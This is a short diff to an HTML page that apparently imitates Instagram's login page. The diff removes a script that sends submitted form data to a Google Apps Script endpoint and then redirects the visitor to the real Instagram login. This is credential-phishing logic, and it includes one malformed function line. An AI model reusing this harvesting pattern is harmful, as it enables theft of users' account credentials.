@@ -69,22 +69,7 @@
         <p style="text-transform:capitalize;" class="copyright">© 2022 Instagram from Meta</p>
     </footer>
 
-    <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbwAmIWIyBWgDaeH_kAC6jPJPq0BTQqg02NSUxCf0lnLLoSQBzxJnP5ycRqg4G3xbORcBw/exec'
-        const form = document.forms['google-sheet']
-      
-        form.addEventListener('submit', e => {
-          e.preventDefault()
-          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-            .then(window.location.href = "https://www.instagram.com/accounts/login/")
-            .catch(error => console.error('Error!', error.message))
-            })
-        function.redirect() {
-            window.location.href = "https://www.instagram.com/accounts/login/";
-        }
-        
 
-      </script>
   
 </body> 
 </html>
